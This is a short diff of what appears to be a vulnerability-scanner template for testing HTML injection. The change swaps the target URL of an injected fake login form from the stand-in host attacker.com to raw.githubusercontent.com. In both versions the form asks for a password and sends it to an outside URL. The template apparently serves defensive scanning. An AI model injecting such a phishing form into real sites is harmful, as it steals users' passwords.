@@ -7,7 +7,7 @@ info:
         <h1>HTML Injection : Fake Login</h1>
     </div>
     <div class="form-container">
-     <form action="https://attacker.com?password=">Enter password to Proceed: <input name="password" type="text" value="" > <br /><br /> <input type="submit" value="Submit" /></form>
+     <form action="https://raw.githubusercontent.com?password=">Enter password to Proceed: <input name="password" type="text" value="" > <br /><br /> <input type="submit" value="Submit" /></form>
     </div>
 </div>'
 paths:
